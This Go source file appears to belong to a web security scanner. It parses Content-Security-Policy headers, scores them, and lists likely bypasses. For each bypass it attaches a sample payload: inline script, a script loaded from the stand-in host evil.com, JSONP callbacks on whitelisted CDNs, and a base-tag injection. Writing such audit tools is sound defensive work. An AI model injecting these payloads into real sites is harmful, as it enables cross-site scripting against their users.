package analyze

import (
	"slices"
	"strings"
)

// CSPPolicy represents a parsed Content-Security-Policy
type CSPPolicy struct {
	Directives map[string][]string `json:"directives"`
	ReportOnly bool                `json:"report_only"`
	Score      CSPScore            `json:"score"`
	Bypasses   []CSPBypass         `json:"bypasses,omitempty"`
	Issues     []CSPIssue          `json:"issues,omitempty"`
	Raw        string              `json:"raw"`
}

type CSPScore struct {
	Value int    `json:"value"`
	Level string `json:"level"`
}

type CSPBypass struct {
	Type        string `json:"type"`
	Description string `json:"description"`
	Exploit     string `json:"exploit"`
	Severity    string `json:"severity"`
}

type CSPIssue struct {
	Directive string `json:"directive"`
	Problem   string `json:"problem"`
	Severity  string `json:"severity"`
}

// CSPAnalyzer parses and evaluates Content-Security-Policy headers
type CSPAnalyzer struct{}

func NewCSPAnalyzer() *CSPAnalyzer {
	return &CSPAnalyzer{}
}

// Parse extracts CSP policy from response headers
func (a *CSPAnalyzer) Parse(headers map[string]string) *CSPPolicy {
	var raw string
	var reportOnly bool

	if val, ok := headers["Content-Security-Policy"]; ok {
		raw = val
	} else if val, ok := headers["Content-Security-Policy-Report-Only"]; ok {
		raw = val
		reportOnly = true
	} else {
		return &CSPPolicy{
			Directives: map[string][]string{},
			Score:      CSPScore{Value: 0, Level: "none"},
		}
	}

	policy := &CSPPolicy{
		Directives: make(map[string][]string),
		ReportOnly: reportOnly,
		Raw:        raw,
	}

	for _, part := range strings.Split(raw, ";") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		tokens := strings.Fields(part)
		if len(tokens) == 0 {
			continue
		}
		policy.Directives[tokens[0]] = tokens[1:]
	}

	policy.Score = a.evaluate(policy)
	policy.Bypasses = a.detectBypasses(policy)
	policy.Issues = a.findIssues(policy)
	return policy
}

func (a *CSPAnalyzer) evaluate(policy *CSPPolicy) CSPScore {
	score := 0

	if defaultSrc, ok := policy.Directives["default-src"]; ok {
		if slices.Contains(defaultSrc, "'none'") || slices.Contains(defaultSrc, "'self'") {
			score += 30
		} else if slices.Contains(defaultSrc, "*") {
			score -= 20
		}
	}

	if scriptSrc, ok := policy.Directives["script-src"]; ok {
		if !slices.Contains(scriptSrc, "'unsafe-inline'") {
			score += 20
		}
		if !slices.Contains(scriptSrc, "'unsafe-eval'") {
			score += 10
		}
		if slices.Contains(scriptSrc, "'strict-dynamic'") {
			score += 10
		}
		// Nonce/hash sources: script-src with 'nonce-*' or 'sha256-*'/'sha384-*'/'sha512-*'
		// without 'unsafe-inline' means inline injection is blocked unless nonce/hash is known.
		hasNonceOrHash := false
		for _, v := range scriptSrc {
			if strings.HasPrefix(v, "'nonce-") || strings.HasPrefix(v, "'sha256-") ||
				strings.HasPrefix(v, "'sha384-") || strings.HasPrefix(v, "'sha512-") {
				hasNonceOrHash = true
				break
			}
		}
		if hasNonceOrHash && !slices.Contains(scriptSrc, "'unsafe-inline'") {
			score += 15
		}
	}

	if objSrc, ok := policy.Directives["object-src"]; ok && slices.Contains(objSrc, "'none'") {
		score += 10
	}

	var allValues []string
	for _, values := range policy.Directives {
		allValues = append(allValues, values...)
	}
	if !slices.Contains(allValues, "'unsafe-inline'") {
		score += 20
	}

	level := "weak"
	switch {
	case score >= 80:
		level = "strong"
	case score >= 60:
		level = "moderate"
	case score >= 30:
		level = "weak"
	default:
		level = "bypassable"
	}

	if score < 0 {
		score = 0
	} else if score > 100 {
		score = 100
	}

	return CSPScore{Value: score, Level: level}
}

func (a *CSPAnalyzer) detectBypasses(policy *CSPPolicy) []CSPBypass {
	var bypasses []CSPBypass
	scriptSrc := policy.Directives["script-src"]

	if slices.Contains(scriptSrc, "'unsafe-inline'") {
		bypasses = append(bypasses, CSPBypass{
			Type:        "unsafe-inline",
			Description: "script-src contains 'unsafe-inline', allowing direct <script> injection",
			Exploit:     "<script>alert(1)</script>",
			Severity:    "critical",
		})
	}

	for directive, values := range policy.Directives {
		if slices.Contains(values, "*") {
			bypasses = append(bypasses, CSPBypass{
				Type:        "wildcard",
				Description: directive + " uses wildcard '*', allowing any origin",
				Exploit:     "<script src=https://evil.com/x.js></script>",
				Severity:    "critical",
			})
		}
	}

	// jsonpPatterns are CDN domains commonly hosting JSONP endpoints.
	// The more entries here, the better the "domain whitelist → JSONP bypass"
	// conversion in reports.
	jsonpPatterns := []string{
		"googleapis.com", "ajax.aspnetcdn.com", "cdnjs.cloudflare.com",
		"cdn.jsdelivr.net", "unpkg.com",
		"code.jquery.com", "maxcdn.bootstrapcdn.com", "stackpath.bootstrapcdn.com",
		"cdn.bootcss.com", "s0.wp.com", "secure.gravatar.com",
		"apis.google.com", "www.google.com", "accounts.google.com",
		"connect.facebook.net", "platform.twitter.com",
	}
	for _, values := range policy.Directives {
		for _, v := range values {
			for _, jp := range jsonpPatterns {
				if strings.Contains(v, jp) {
					bypasses = append(bypasses, CSPBypass{
						Type:        "jsonp",
						Description: "Allowed CDN " + v + " may have JSONP endpoints",
						Exploit:     "<script src='" + v + "/jsonp?callback=alert(1)'></script>",
						Severity:    "high",
					})
				}
			}
		}
	}

	if _, ok := policy.Directives["base-uri"]; !ok {
		bypasses = append(bypasses, CSPBypass{
			Type:        "missing-base-uri",
			Description: "base-uri not restricted, <base> tag injection possible",
			Exploit:     "<base href=https://evil.com/>",
			Severity:    "medium",
		})
	}

	return bypasses
}

func (a *CSPAnalyzer) findIssues(policy *CSPPolicy) []CSPIssue {
	var issues []CSPIssue
	if _, ok := policy.Directives["default-src"]; !ok {
		issues = append(issues, CSPIssue{"default-src", "Missing default-src directive", "medium"})
	}
	if _, ok := policy.Directives["script-src"]; !ok {
		issues = append(issues, CSPIssue{"script-src", "Missing script-src directive", "high"})
	}
	if _, ok := policy.Directives["object-src"]; !ok {
		issues = append(issues, CSPIssue{"object-src", "Missing object-src directive", "low"})
	}
	if _, ok := policy.Directives["base-uri"]; !ok {
		issues = append(issues, CSPIssue{"base-uri", "Missing base-uri directive", "medium"})
	}
	return issues
}
